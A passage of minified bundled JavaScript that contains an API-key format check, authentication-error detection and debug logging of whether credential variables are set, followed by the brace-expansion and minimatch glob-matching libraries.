X!=="string")return!1;return/^sk-ant-api03-[A-Za-z0-9+/\-_]+=*$/.test(X)}isAuthenticationError(X){if(!X)return!1;let J=X.toLowerCase();return J.includes("invalid x-api-key")||J.includes("authentication_error")||J.includes("401")||J.includes("unauthorized")||J.includes("invalid api key")}logAuthenticationFailureDebugInfo(){U.debug("Authentication failed - credential debugging info:");let X=jR();if(X)U.debug("Credential source: development mode"),U.debug(`CLAUDE_CODE_MAX_API_KEY set: ${!!process.env.CLAUDE_CODE_MAX_API_KEY}`),U.debug(`ANTHROPIC_API_KEY set: ${!!process.env.ANTHROPIC_API_KEY}`);else U.debug("Credential source: vended"),U.debug(`Credential manager available: ${!!this.credentialManager}`);U.debug(`ANTHROPIC_API_KEY environment variable set: ${!!process.env.ANTHROPIC_API_KEY}`),U.debug(`Working directory: ${this.repoPath}`),U.debug(`Development mode: ${X}`),U.debug("Note: Claude CLI authentication differs from SDK - format validation may reveal incompatibilities")}}});var DR=v((Pe1,AR)=>{AR.exports=FR;function FR(X,J,Q){if(X instanceof RegExp)X=OR(X,Q);if(J instanceof RegExp)J=OR(J,Q);var Y=RR(X,J,Q);return Y&&{start:Y[0],end:Y[1],pre:Q.slice(0,Y[0]),body:Q.slice(Y[0]+X.length,Y[1]),post:Q.slice(Y[1]+J.length)}}function OR(X,J){var Q=J.match(X);return Q?Q[0]:null}FR.range=RR;function RR(X,J,Q){var Y,W,G,H,z,$=Q.indexOf(X),V=Q.indexOf(J,$+1),K=$;if($>=0&&V>0){if(X===J)return[$,V];Y=[],G=Q.length;while(K>=0&&!z){if(K==$)Y.push(K),$=Q.indexOf(X,K+1);else if(Y.length==1)z=[Y.pop(),V];else{if(W=Y.pop(),W<G)G=W,H=V;V=Q.indexOf(J,K+1)}K=$<V&&$>=0?$:V}if(Y.length)z=[G,H]}return z}});var TR=v((Se1,SR)=>{var wR=DR();SR.exports=xv1;var NR="\x00SLASH"+Math.random()+"\x00",LR="\x00OPEN"+Math.random()+"\x00",g3="\x00CLOSE"+Math.random()+"\x00",IR="\x00COMMA"+Math.random()+"\x00",CR="\x00PERIOD"+Math.random()+"\x00";function y3(X){return parseInt(X,10)==X?parseInt(X,10):X.charCodeAt(0)}function vv1(X){return X.split("\\\\").join(NR).split("\\{").join(LR).split("\\}").join(g3).split("\\,").join(IR).split("\\.").join(CR)}function fv1(X){return X.split(NR).join("\\").split(LR).join("{").split(g3).join("}").split(IR).join(",").split(CR).join(".")}function PR(X){if(!X)return[""];var J=[],Q=wR("{","}",X);if(!Q)return X.split(",");var{pre:Y,body:W,post:G}=Q,H=Y.split(",");H[H.length-1]+="{"+W+"}";var z=PR(G);if(G.length)H[H.length-1]+=z.shift(),H.push.apply(H,z);return J.push.apply(J,H),J}function xv1(X){if(!X)return[];if(X.substr(0,2)==="{}")X="\\{\\}"+X.substr(2);return b7(vv1(X),!0).map(fv1)}function hv1(X){return"{"+X+"}"}function yv1(X){return/^-?0\d/.test(X)}function gv1(X,J){return X<=J}function mv1(X,J){return X>=J}function b7(X,J){var Q=[],Y=wR("{","}",X);if(!Y)return[X];var W=Y.pre,G=Y.post.length?b7(Y.post,!1):[""];if(/\$$/.test(Y.pre))for(var H=0;H<G.length;H++){var z=W+"{"+Y.body+"}"+G[H];Q.push(z)}else{var $=/^-?\d+\.\.-?\d+(?:\.\.-?\d+)?$/.test(Y.body),V=/^[a-zA-Z]\.\.[a-zA-Z](?:\.\.-?\d+)?$/.test(Y.body),K=$||V,Z=Y.body.indexOf(",")>=0;if(!K&&!Z){if(Y.post.match(/,(?!,).*\}/))return X=Y.pre+"{"+Y.body+g3+Y.post,b7(X);return[X]}var q;if(K)q=Y.body.split(/\.\./);else if(q=PR(Y.body),q.length===1){if(q=b7(q[0],!1).map(hv1),q.length===1)return G.map(function(c){return Y.pre+q[0]+c})}var B;if(K){var M=y3(q[0]),O=y3(q[1]),R=Math.max(q[0].length,q[1].length),I=q.length==3?Math.abs(y3(q[2])):1,F=gv1,T=O<M;if(T)I*=-1,F=mv1;var b=q.some(yv1);B=[];for(var h=M;F(h,O);h+=I){var L;if(V){if(L=String.fromCharCode(h),L==="\\")L=""}else if(L=String(h),b){var N=R-L.length;if(N>0){var k=Array(N+1).join("0");if(h<0)L="-"+k+L.slice(1);else L=k+L}}B.push(L)}}else{B=[];for(var _=0;_<q.length;_++)B.push.apply(B,b7(q[_],!1))}for(var _=0;_<B.length;_++)for(var H=0;H<G.length;H++){var z=W+B[_]+G[H];if(!J||K||z)Q.push(z)}}return Q}});var v7=(X)=>{if(typeof X!=="string")throw TypeError("invalid pattern");if(X.length>65536)throw TypeError("pattern is too long")};var uv1,f7=(X)=>X.replace(/[[\]\\-]/g,"\\$&"),cv1=(X)=>X.replace(/[-[\]{}()*+?.,\\^$|#\s]/g,"\\$&"),_R=(X)=>X.join(""),ER=(X,J)=>{let Q=J;if(X.charAt(Q)!=="[")throw Error("not in a brace expression");let Y=[],W=[],G=Q+1,H=!1,z=!1,$=!1,V=!1,K=Q,Z="";X:while(G<X.length){let O=X.charAt(G);if((O==="!"||O==="^")&&G===Q+1){V=!0,G++;continue}if(O==="]"&&H&&!$){K=G+1;break}if(H=!0,O==="\\"){if(!$){$=!0,G++;continue}}if(O==="["&&!$){for(let[R,[I,F,T]]of Object.entries(uv1))if(X.startsWith(R,G)){if(Z)return["$.",!1,X.length-Q,!0];if(G+=R.length,T)W.push(I);else Y.push(I);z=z||F;continue X}}if($=!1,Z){if(O>Z)Y.push(f7(Z)+"-"+f7(O));else if(O===Z)Y.push(f7(O));Z="",G++;continue}if(X.startsWith("-]",G+1)){Y.push(f7(O+"-")),G+=2;continue}if(X.startsWith("-",G+1)){Z=O,G+=2;continue}Y.push(f7(O)),G++}if(K<G)return["",!1,0,!1];if(!Y.length&&!W.length)return["$.",!1,X.length-Q,!0];if(W.length===0&&Y.length===1&&/^\\?.$/.test(Y[0])&&!V){let O=Y[0].length===2?Y[0].slice(-1):Y[0];return[cv1(O),!1,K-Q,!1]}let q="["+(V?"^":"")+_R(Y)+"]",B="["+(V?"":"^")+_R(W)+"]";return[Y.length&&W.length?"("+q+"|"+B+")":Y.length?q:B,z,K-Q,!0]};var kR=s(()=>{uv1={"[:alnum:]":["\\p{L}\\p{Nl}\\p{Nd}",!0],"[:alpha:]":["\\p{L}\\p{Nl}",!0],"[:ascii:]":["\\x00-\\x7f",!1],"[:blank:]":["\\p{Zs}\\t",!0],"[:cntrl:]":["\\p{Cc}",!0],"[:digit:]":["\\p{Nd}",!0],"[:graph:]":["\\p{Z}\\p{C}",!0,!0],"[:lower:]":["\\p{Ll}",!0],"[:print:]":["\\p{C}",!0],"[:punct:]":["\\p{P}",!0],"[:space:]":["\\p{Z}\\t\\r\\n\\v\\f",!0],"[:upper:]":["\\p{Lu}",!0],"[:word:]":["\\p{L}\\p{Nl}\\p{Nd}\\p{Pc}",!0],"[:xdigit:]":["A-Fa-f0-9",!1]}});var r9=(X,{windowsPathsNoEscape:J=!1}={})=>{return J?X.replace(/\[([^\/\\])\]/g,"$1"):X.replace(/((?!\\).|^)\[([^\/\\])\]/g,"$1$2").replace(/\\([^\/])/g,"$1")};class h0{type;#X;#J;#G=!1;#Y=[];#H;#A;#V;#U=!1;#z;#$;#W=!1;constructor(X,J,Q={}){if(this.type=X,X)this.#J=!0;if(this.#H=J,this.#X=this.#H?this.#H.#X:this,this.#z=this.#X===this?Q:this.#X.#z,this.#V=this.#X===this?[]:this.#X.#V,X==="!"&&!this.#X.#U)this.#V.push(this);this.#A=this.#H?this.#H.#Y.length:0}get hasMagic(){if(this.#J!==void 0)return this.#J;for(let X of this.#Y){if(typeof X==="string")continue;if(X.type||X.hasMagic)return this.#J=!0}return this.#J}toString(){if(this.#$!==void 0)return this.#$;if(!this.type)return this.#$=this.#Y.map((X)=>String(X)).join("");else return this.#$=this.type+"("+this.#Y.map((X)=>String(X)).join("|")+")"}#j(){if(this!==this.#X)throw Error("should only call on root");if(this.#U)return this;this.toString(),this.#U=!0;let X;while(X=this.#V.pop()){if(X.type!=="!")continue;let J=X,Q=J.#H;while(Q){for(let Y=J.#A+1;!Q.type&&Y<Q.#Y.length;Y++)for(let W of X.#Y){if(typeof W==="string")throw Error("string part in extglob AST??");W.copyIn(Q.#Y[Y])}J=Q,Q=J.#H}}return this}push(...X){for(let J of X){if(J==="")continue;if(typeof J!=="string"&&!(J instanceof h0&&J.#H===this))throw Error("invalid part: "+J);this.#Y.push(J)}}toJSON(){let X=this.type===null?this.#Y.slice().map((J)=>typeof J==="string"?J:J.toJSON()):[this.type,...this.#Y.map((J)=>J.toJSON())];if(this.isStart()&&!this.type)X.unshift([]);if(this.isEnd()&&(this===this.#X||this.#X.#U&&this.#H?.type==="!"))X.push({});return X}isStart(){if(this.#X===this)return!0;if(!this.#H?.isStart())return!1;if(this.#A===0)return!0;let X=this.#H;for(let J=0;J<this.#A;J++){let Q=X.#Y[J];if(!(Q instanceof h0&&Q.type==="!"))return!1}return!0}isEnd(){if(this.#X===this)return!0;if(this.#H?.type==="!")return!0;if(!this.#H?.isEnd())return!1;if(!this.type)return this.#H?.isEnd();let X=this.#H?this.#H.#Y.length:0;return this.#A===X-1}copyIn(X){if(typeof X==="string")this.push(X);else this.push(X.clone(this))}clone(X){let J=new h0(this.type,X);for(let Q of this.#Y)J.copyIn(Q);return J}static#O(X,J,Q,Y){let W=!1,G=!1,H=-1,z=!1;if(J.type===null){let q=Q,B="";while(q<X.length){let M=X.charAt(q++);if(W||M==="\\"){W=!W,B+=M;continue}if(G){if(q===H+1){if(M==="^"||M==="!")z=!0}else if(M==="]"&&!(q===H+2&&z))G=!1;B+=M;continue}else if(M==="["){G=!0,H=q,z=!1,B+=M;continue}if(!Y.noext&&bR(M)&&X.charAt(q)==="("){J.push(B),B="";let O=new h0(M,J);q=h0.#O(X,O,q,Y),J.push(O);continue}B+=M}return J.push(B),q}let $=Q+1,V=new h0(null,J),K=[],Z="";while($<X.length){let q=X.charAt($++);if(W||q==="\\"){W=!W,Z+=q;continue}if(G){if($===H+1){if(q==="^"||q==="!")z=!0}else if(q==="]"&&!($===H+2&&z))G=!1;Z+=q;continue}else if(q==="["){G=!0,H=$,z=!1,Z+=q;continue}if(bR(q)&&X.charAt($)==="("){V.push(Z),Z="";let B=new h0(q,V);V.push(B),$=h0.#O(X,B,$,Y);continue}if(q==="|"){V.push(Z),Z="",K.push(V),V=new h0(null,J);continue}if(q===")"){if(Z===""&&J.#Y.length===0)J.#W=!0;return V.push(Z),Z="",J.push(...K,V),$}Z+=q}return J.type=null,J.#J=void 0,J.#Y=[X.substring(Q-1)],$}static fromGlob(X,J={}){let Q=new h0(null,void 0,J);return h0.#O(X,Q,0,J),Q}toMMPattern(){if(this!==this.#X)return this.#X.toMMPattern();let X=this.toString(),[J,Q,Y,W]=this.toRegExpSource();if(!(Y||this.#J||this.#z.nocase&&!this.#z.nocaseMagicOnly&&X.toUpperCase()!==X.toLowerCase()))return Q;let H=(this.#z.nocase?"i":"")+(W?"u":"");return Object.assign(new RegExp(`^${J}$`,H),{_src:J,_glob:X})}get options(){return this.#z}toRegExpSource(X){let J=X??!!this.#z.dot;if(this.#X===this)this.#j();if(!this.type){let z=this.isStart()&&this.isEnd(),$=this.#Y.map((q)=>{let[B,M,O,R]=typeof q==="string"?h0.#Z(q,this.#J,z):q.toRegExpSource(X);return this.#J=this.#J||O,this.#G=this.#G||R,B}).join(""),V="";if(this.isStart()){if(typeof this.#Y[0]==="string"){if(!(this.#Y.length===1&&iv1.has(this.#Y[0]))){let B=dv1,M=J&&B.has($.charAt(0))||$.startsWith("\\.")&&B.has($.charAt(2))||$.startsWith("\\.\\.")&&B.has($.charAt(4)),O=!J&&!X&&B.has($.charAt(0));V=M?pv1:O?l4:""}}}let K="";if(this.isEnd()&&this.#X.#U&&this.#H?.type==="!")K="(?:$|\\/)";return[V+$+K,r9($),this.#J=!!this.#J,this.#G]}let Q=this.type==="*"||this.type==="+",Y=this.type==="!"?"(?:(?!(?:":"(?:",W=this.#q(J);if(this.isStart()&&this.isEnd()&&!W&&this.type!=="!"){let z=this.toString();return this.#Y=[z],this.type=null,this.#J=void 0,[z,r9(this.toString()),!1,!1]}let G=!Q||X||J||!l4?"":this.#q(!0);if(G===W)G="";if(G)W=`(?:${W})(?:${G})*?`;let H="";if(this.type==="!"&&this.#W)H=(this.isStart()&&!J?l4:"")+fR;else{let z=this.type==="!"?"))"+(this.isStart()&&!J&&!X?l4:"")+vR+")":this.type==="@"?")":this.type==="?"?")?":this.type==="+"&&G?")":this.type==="*"&&G?")?":`)${this.type}`;H=Y+W+z}return[H,r9(W),this.#J=!!this.#J,this.#G]}#q(X){return this.#Y.map((J)=>{if(typeof J==="string")throw Error("string type in extglob ast??");let[Q,Y,W,G]=J.toRegExpSource(X);return this.#G=this.#G||G,Q}).filter((J)=>!(this.isStart()&&this.isEnd())||!!J).join("|")}static#Z(X,J,Q=!1){let Y=!1,W="",G=!1;for(let H=0;H<X.length;H++){let z=X.charAt(H);if(Y){Y=!1,W+=(rv1.has(z)?"\\":"")+z;continue}if(z==="\\"){if(H===X.length-1)W+="\\\\";else Y=!0;continue}if(z==="["){let[$,V,K,Z]=ER(X,H);if(K){W+=$,G=G||V,H+=K-1,J=J||Z;continue}}if(z==="*"){if(Q&&X==="*")W+=fR;else W+=vR;J=!0;continue}if(z==="?"){W+=m3,J=!0;continue}W+=av1(z)}return[W,r9(X),!!J,G]}}var lv1,bR=(X)=>lv1.has(X),pv1="(?!(?:^|/)\\.\\.?(?:$|/))",l4="(?!\\.)",dv1,iv1,rv1,av1=(X)=>X.replace(/[-[\]{}()*+?.,\\^$|#\s]/g,"\\$&"),m3="[^/]",vR,fR;var u3=s(()=>{kR();lv1=new Set(["!","?","+","*","@"]),dv1=new Set(["[","."]),iv1=new Set(["..","."]),rv1=new Set("().*{}+?[]^$\\!"),vR=m3+"*?",fR=m3+"+?"});var HJ=(X,{windowsPathsNoEscape:J=!1}={})=>{return J?X.replace(/[?*()[\]]/g,"[$&]"):X.replace(/[?*()[\]\\]/g,"\\$&")};class E9{options;set;pattern;windowsPathsNoEscape;nonegate;negate;comment;empty;preserveMultipleSlashes;partial;globSet;globParts;nocase;isWindows;platform;windowsNoMagicRoot;regexp;constructor(X,J={}){if(v7(X),J=J||{},this.options=J,this.pattern=X,this.platform=J.platform||uR,this.isWindows=this.platform==="win32",this.windowsPathsNoEscape=!!J.windowsPathsNoEscape||J.allowWindowsEscape===!1,this.windowsPathsNoEscape)this.pattern=this.pattern.replace(/\\/g,"/");this.preserveMultipleSlashes=!!J.preserveMultipleSlashes,this.regexp=null,this.negate=!1,this.nonegate=!!J.nonegate,this.comment=!1,this.empty=!1,this.partial=!!J.partial,this.nocase=!!this.options.nocase,this.windowsNoMagicRoot=J.windowsNoMagicRoot!==void 0?J.windowsNoMagicRoot:!!(this.isWindows&&this.nocase),this.globSet=[],this.globParts=[],this.set=[],this.make()}hasMagic(){if(this.options.magicalBraces&&this.set.length>1)return!0;for(let X of this.set)for(let J of X)if(typeof J!=="string")return!0;return!1}debug(...X){}make(){let X=this.pattern,J=this.options;if(!J.nocomment&&X.charAt(0)==="#"){this.comment=!0;return}if(!X){this.empty=!0;return}if(this.parseNegate(),this.globSet=[...new Set(this.braceExpand())],J.debug)this.debug=(...W)=>console.error(...W);this.debug(this.pattern,this.globSet);let Q=this.globSet.map((W)=>this.slashSplit(W));this.globParts=this.preprocess(Q),this.debug(this.pattern,this.globParts);let Y=this.globParts.map((W,G,H)=>{if(this.isWindows&&this.windowsNoMagicRoot){let z=W[0]===""&&W[1]===""&&(W[2]==="?"||!hR.test(W[2]))&&!hR.test(W[3]),$=/^[a-z]:/i.test(W[0]);if(z)return[...W.slice(0,4),...W.slice(4).map((V)=>this.parse(V))];else if($)return[W[0],...W.slice(1).map((V)=>this.parse(V))]}return W.map((z)=>this.parse(z))});if(this.debug(this.pattern,Y),this.set=Y.filter((W)=>W.indexOf(!1)===-1),this.isWindows)for(let W=0;W<this.set.length;W++){let G=this.set[W];if(G[0]===""&&G[1]===""&&this.globParts[W][2]==="?"&&typeof G[3]==="string"&&/^[a-z]:$/i.test(G[3]))G[2]="?"}this.debug(this.pattern,this.set)}preprocess(X){if(this.options.noglobstar){for(let Q=0;Q<X.length;Q++)for(let Y=0;Y<X[Q].length;Y++)if(X[Q][Y]==="**")X[Q][Y]="*"}let{optimizationLevel:J=1}=this.options;if(J>=2)X=this.firstPhasePreProcess(X),X=this.secondPhasePreProcess(X);else if(J>=1)X=this.levelOneOptimize(X);else X=this.adjascentGlobstarOptimize(X);return X}adjascentGlobstarOptimize(X){return X.map((J)=>{let Q=-1;while((Q=J.indexOf("**",Q+1))!==-1){let Y=Q;while(J[Y+1]==="**")Y++;if(Y!==Q)J.splice(Q,Y-Q)}return J})}levelOneOptimize(X){return X.map((J)=>{return J=J.reduce((Q,Y)=>{let W=Q[Q.length-1];if(Y==="**"&&W==="**")return Q;if(Y===".."){if(W&&W!==".."&&W!=="."&&W!=="**")return Q.pop(),Q}return Q.push(Y),Q},[]),J.length===0?[""]:J})}levelTwoFileOptimize(X){if(!Array.isArray(X))X=this.slashSplit(X);let J=!1;do{if(J=!1,!this.preserveMultipleSlashes){for(let Y=1;Y<X.length-1;Y++){let W=X[Y];if(Y===1&&W===""&&X[0]==="")continue;if(W==="."||W==="")J=!0,X.splice(Y,1),Y--}if(X[0]==="."&&X.length===2&&(X[1]==="."||X[1]===""))J=!0,X.pop()}let Q=0;while((Q=X.indexOf("..",Q+1))!==-1){let Y=X[Q-1];if(Y&&Y!=="."&&Y!==".."&&Y!=="**")J=!0,X.splice(Q-1,2),Q-=2}}while(J);return X.length===0?[""]:X}firstPhasePreProcess(X){let J=!1;do{J=!1;for(let Q of X){let Y=-1;while((Y=Q.indexOf("**",Y+1))!==-1){let G=Y;while(Q[G+1]==="**")G++;if(G>Y)Q.splice(Y+1,G-Y);let H=Q[Y+1],z=Q[Y+2],$=Q[Y+3];if(H!=="..")continue;if(!z||z==="."||z===".."||!$||$==="."||$==="..")continue;J=!0,Q.splice(Y,1);let V=Q.slice(0);V[Y]="**",X.push(V),Y--}if(!this.preserveMultipleSlashes){for(let G=1;G<Q.length-1;G++){let H=Q[G];if(G===1&&H===""&&Q[0]==="")continue;if(H==="."||H==="")J=!0,Q.splice(G,1),G--}if(Q[0]==="."&&Q.length===2&&(Q[1]==="."||Q[1]===""))J=!0,Q.pop()}let W=0;while((W=Q.indexOf("..",W+1))!==-1){let G=Q[W-1];if(G&&G!=="."&&G!==".."&&G!=="**"){J=!0;let z=W===1&&Q[W+1]==="**"?["."]:[];if(Q.splice(W-1,2,...z),Q.length===0)Q.push("");W-=2}}}}while(J);return X}secondPhasePreProcess(X){for(let J=0;J<X.length-1;J++)for(let Q=J+1;Q<X.length;Q++){let Y=this.partsMatch(X[J],X[Q],!this.preserveMultipleSlashes);if(Y){X[J]=[],X[Q]=Y;break}}return X.filter((J)=>J.length)}partsMatch(X,J,Q=!1){let Y=0,W=0,G=[],H="";while(Y<X.length&&W<J.length)if(X[Y]===J[W])G.push(H==="b"?J[W]:X[Y]),Y++,W++;else if(Q&&X[Y]==="**"&&J[W]===X[Y+1])G.push(X[Y]),Y++;else if(Q&&J[W]==="**"&&X[Y]===J[W+1])G.push(J[W]),W++;else if(X[Y]==="*"&&J[W]&&(this.options.dot||!J[W].startsWith("."))&&J[W]!=="**"){if(H==="b")return!1;H="a",G.push(X[Y]),Y++,W++}else if(J[W]==="*"&&X[Y]&&(this.options.dot||!X[Y].startsWith("."))&&X[Y]!=="**"){if(H==="a")return!1;H="b",G.push(J[W]),Y++,W++}else return!1;return X.length===J.length&&G}parseNegate(){if(this.nonegate)return;let X=this.pattern,J=!1,Q=0;for(let Y=0;Y<X.length&&X.charAt(Y)==="!";Y++)J=!J,Q++;if(Q)this.pattern=X.slice(Q);this.negate=J}matchOne(X,J,Q=!1){let Y=this.options;if(this.isWindows){let M=typeof X[0]==="string"&&/^[a-z]:$/i.test(X[0]),O=!M&&X[0]===""&&X[1]===""&&X[2]==="?"&&/^[a-z]:$/i.test(X[3]),R=typeof J[0]==="string"&&/^[a-z]:$/i.test(J[0]),I=!R&&J[0]===""&&J[1]===""&&J[2]==="?"&&typeof J[3]==="string"&&/^[a-z]:$/i.test(J[3]),F=O?3:M?0:void 0,T=I?3:R?0:void 0;if(typeof F==="number"&&typeof T==="number"){let[b,h]=[X[F],J[T]];if(b.toLowerCase()===h.toLowerCase()){if(J[T]=b,T>F)J=J.slice(T);else if(F>T)X=X.slice(F)}}}let{optimizationLevel:W=1}=this.options;if(W>=2)X=this.levelTwoFileOptimize(X);this.debug("matchOne",this,{file:X,pattern:J}),this.debug("matchOne",X.length,J.length);for(var G=0,H=0,z=X.length,$=J.length;G<z&&H<$;G++,H++){this.debug("matchOne loop");var V=J[H],K=X[G];if(this.debug(J,V,K),V===!1)return!1;if(V===y0){this.debug("GLOBSTAR",[J,V,K]);var Z=G,q=H+1;if(q===$){this.debug("** at the end");for(;G<z;G++)if(X[G]==="."||X[G]===".."||!Y.dot&&X[G].charAt(0)===".")return!1;return!0}while(Z<z){var B=X[Z];if(this.debug(`
globstar while`,X,Z,J,q,B),this.matchOne(X.slice(Z),J.slice(q),Q))return this.debug("globstar found match!",Z,z,B),!0;else{if(B==="."||B===".."||!Y.dot&&B.charAt(0)==="."){this.debug("dot detected!",X,Z,J,q);break}this.debug("globstar swallow a segment, and continue"),Z++}}if(Q){if(this.debug(`
>>> no match, partial?`,X,Z,J,q),Z===z)return!0}return!1}let M;if(typeof V==="string")M=K===V,this.debug("string match",V,K,M);else M=V.test(K),this.debug("pattern match",V,K,M);if(!M)return!1}if(G===z&&H===$)return!0;else if(G===z)return Q;else if(H===$)return G===z-1&&X[G]==="";else throw Error("wtf?")}braceExpand(){return cR(this.pattern,this.options)}parse(X){v7(X);let J=this.options;if(X==="**")return y0;if(X==="")return"";let Q,Y=null;if(Q=X.match(Gf1))Y=J.dot?zf1:Hf1;else if(Q=X.match(nv1))Y=(J.nocase?J.dot?ev1:tv1:J.dot?ov1:sv1)(Q[1]);else if(Q=X.match($f1))Y=(J.nocase?J.dot?Kf1:Vf1:J.dot?Uf1:Zf1)(Q);else if(Q=X.match(Xf1))Y=J.dot?Qf1:Jf1;else if(Q=X.match(Yf1))Y=Wf1;let W=h0.fromGlob(X,this.options).toMMPattern();if(Y&&typeof W==="object")Reflect.defineProperty(W,"test",{value:Y});return W}makeRe(){if(this.regexp||this.regexp===!1)return this.regexp;let X=this.set;if(!X.length)return this.regexp=!1,this.regexp;let J=this.options,Q=J.noglobstar?Mf1:J.dot?jf1:Of1,Y=new Set(J.nocase?["i"]:[]),W=X.map((z)=>{let $=z.map((V)=>{if(V instanceof RegExp)for(let K of V.flags.split(""))Y.add(K);return typeof V==="string"?wf1(V):V===y0?y0:V._src});return $.forEach((V,K)=>{let Z=$[K+1],q=$[K-1];if(V!==y0||q===y0)return;if(q===void 0)if(Z!==void 0&&Z!==y0)$[K+1]="(?:\\/|"+Q+"\\/)?"+Z;else $[K]=Q;else if(Z===void 0)$[K-1]=q+"(?:\\/|"+Q+")?";else if(Z!==y0)$[K-1]=q+"(?:\\/|\\/"+Q+"\\/)"+Z,$[K+1]=y0}),$.filter((V)=>V!==y0).join("/")}).join("|"),[G,H]=X.length>1?["(?:",")"]:["",""];if(W="^"+G+W+H+"$",this.negate)W="^(?!"+W+").+$";try{this.regexp=new RegExp(W,[...Y].join(""))}catch(z){this.regexp=!1}return this.regexp}slashSplit(X){if(this.preserveMultipleSlashes)return X.split("/");else if(this.isWindows&&/^\/\/[^\/]+/.test(X))return["",...X.split(/\/+/)];else return X.split(/\/+/)}match(X,J=this.partial){if(this.debug("match",X,this.pattern),this.comment)return!1;if(this.empty)return X==="";if(X==="/"&&J)return!0;let Q=this.options;if(this.isWindows)X=X.split("\\").join("/");let Y=this.slashSplit(X);this.debug(this.pattern,"split",Y);let W=this.set;this.debug(this.pattern,"set",W);let G=Y[Y.length-1];if(!G)for(let H=Y.length-2;!G&&H>=0;H--)G=Y[H];for(let H=0;H<W.length;H++){let z=W[H],$=Y;if(Q.matchBase&&z.length===1)$=[G];if(this.matchOne($,z,J)){if(Q.flipNegate)return!0;return!this.negate}}if(Q.flipNegate)return!1;return this.negate}static defaults(X){return e0.defaults(X).Minimatch}}var yR,e0=(X,J,Q={})=>{if(v7(J),!Q.nocomment&&J.charAt(0)==="#")return!1;return new E9(J,Q).match(X)},nv1,sv1=(X)=>(J)=>!J.startsWith(".")&&J.endsWith(X),ov1=(X)=>(J)=>J.endsWith(X),tv1=(X)=>{return X=X.toLowerCase(),(J)=>!J.startsWith(".")&&J.toLowerCase().endsWith(X)},ev1=(X)=>{return X=X.toLowerCase(),(J)=>J.toLowerCase().endsWith(X)},Xf1,Jf1=(X)=>!X.startsWith(".")&&X.includes("."),Qf1=(X)=>X!=="."&&X!==".."&&X.includes("."),Yf1,Wf1=(X)=>X!=="."&&X!==".."&&X.startsWith("."),Gf1,Hf1=(X)=>X.length!==0&&!X.startsWith("."),zf1=(X)=>X.length!==0&&X!=="."&&X!=="..",$f1,Vf1=([X,J=""])=>{let Q=gR([X]);if(!J)return Q;return J=J.toLowerCase(),(Y)=>Q(Y)&&Y.toLowerCase().endsWith(J)},Kf1=([X,J=""])=>{let Q=mR([X]);if(!J)return Q;return J=J.toLowerCase(),(Y)=>Q(Y)&&Y.toLowerCase().endsWith(J)},Uf1=([X,J=""])=>{let Q=mR([X]);return!J?Q:(Y)=>Q(Y)&&Y.endsWith(J)},Zf1=([X,J=""])=>{let Q=gR([X]);return!J?Q:(Y)=>Q(Y)&&Y.endsWith(J)},gR=([X])=>{let J=X.length;return(Q)=>Q.length===J&&!Q.startsWith(".")},mR=([X])=>{let J=X.length;return(Q)=>Q.length===J&&Q!=="."&&Q!==".."},uR,xR,qf1,y0,Bf1="[^/]",Mf1,jf1="(?:(?!(?:\\/|^)(?:\\.{1,2})($|\\/)).)*?",Of1="(?:(?!(?:\\/|^)\\.).)*?",Ff1=(X,J={})=>(Q)=>e0(Q,X,J),_9=(X,J={})=>Object.assign({},X,J),Rf1=(X)=>{if(!X||typeof X!=="object"||!Object.keys(X).length)return e0;let J=e0;return Object.assign((Y,W,G={})=>J(Y,W,_9(X,G)),{Minimatch:class extends J.Minimatch{constructor(W,G={}){super(W,_9(X,G))}static defaults(W){return J.defaults(_9(X,W)).Minimatch}},AST:class extends J.AST{constructor(W,G,H={}){super(W,G,_9(X,H))}static fromGlob(W,G={}){return J.AST.fromGlob(W,_9(X,G))}},unescape:(Y,W={})=>J.unescape(Y,_9(X,W)),escape:(Y,W={})=>J.escape(Y,_9(X,W)),filter:(Y,W={})=>J.filter(Y,_9(X,W)),defaults:(Y)=>J.defaults(_9(X,Y)),makeRe:(Y,W={})=>J.makeRe(Y,_9(X,W)),braceExpand:(Y,W={})=>J.braceExpand(Y,_9(X,W)),match:(Y,W,G={})=>J.match(Y,W,_9(X,G)),sep:J.sep,GLOBSTAR:y0})},cR=(X,J={})=>{if(v7(X),J.nobrace||!/\{(?:(?!\{).)*\}/.test(X))return[X];return yR.default(X)},Af1=(X,J={})=>new E9(X,J).makeRe(),Df1=(X,J,Q={})=>{let Y=new E9(J,Q);if(X=X.filter((W)=>Y.match(W)),Y.options.nonull&&!X.length)X.push(J);return X},hR,wf1=(X)=>X.replace(/[-[\]{}()*+?.,\\^$|#\s]/g,"\\$&");var BX=s(()=>{u3();u3();yR=z0(TR(),1),nv1=/^\*+([^+@!?\*\[\(]*)$/,Xf1=/^\*+\.\*+$/,Yf1=/^\.\*+$/,Gf1=/^\*+$/,$f1=/^\?+([^+@!?\*\[\(]*)?$/,uR=typeof process==="object"&&process?typeof process.env==="object"&&process.env&&process.env.__MINIMATCH_TESTING_PLATFORM__||process.platform:"posix",xR={win32:{sep:"\\"},posix:{sep:"/"}},qf1=uR==="win32"?xR.win32.sep:xR.posix.sep;e0.sep=qf1;y0=Symbol("globstar **");e0.GLOBSTAR=y0;Mf1=Bf1+"*?";e0.filter=Ff1;e0.defaults=Rf1;e0.braceExpand=cR;e0.makeRe=Af1;e0.match=Df1;hR=/[?*]|[+@!]\(.*?\)|\[|\]/;e0.AST=h0;e0.Minimatch=E9;e0.escape=HJ;e0.unescape=r9});class $J{heap;length;static#X=!1;static create(X){let J=iR(X);if(!J)return[];$J.#X=!0;let Q=new $J(X,J);return $J.#X=!1,Q}constructor(X,J){if(!$J.#X)throw TypeError("instantiate Stack using Stack.create(n)");this.heap=new J(X),this.length=0}push(X){this.heap[this.length++]=X}pop(){return this.heap[--this.length]}}var zJ,pR,c3,dR=(X,J,Q,Y)=>{typeof c3.emitWarning==="function"?c3.emitWarning(X,J,Q,Y):console.error(`[${Q}] ${J}: ${X}`)},p4,lR,Nf1=(X)=>!pR.has(X),pe1,MX=(X)=>X&&X===Math.floor(X)&&X>0&&isFinite(X),iR=(X)=>!MX(X)?null:X<=Math.pow(2,8)?Uint8Array:X<=Math.pow(2,16)?Uint16Array:X<=Math.pow(2,32)?Uint32Array:X<=Number.MAX_SAFE_INTEGER?x7:null,x7,h7;var rR=s(()=>{zJ=typeof performance==="object"&&performance&&typeof performance.now==="function"?performance:Date,pR=new Set,c3=typeof process==="object"&&!!process?process:{},p4=globalThis.AbortController,lR=globalThis.AbortSignal;if(typeof p4>"u"){lR=class{onabort;_onabort=[];reason;aborted=!1;addEventListener(Y,W){this._onabort.push(W)}},p4=class{constructor(){J()}signal=new lR;abort(Y){if(this.signal.aborted)return;this.signal.reason=Y,this.signal.aborted=!0;for(let W of 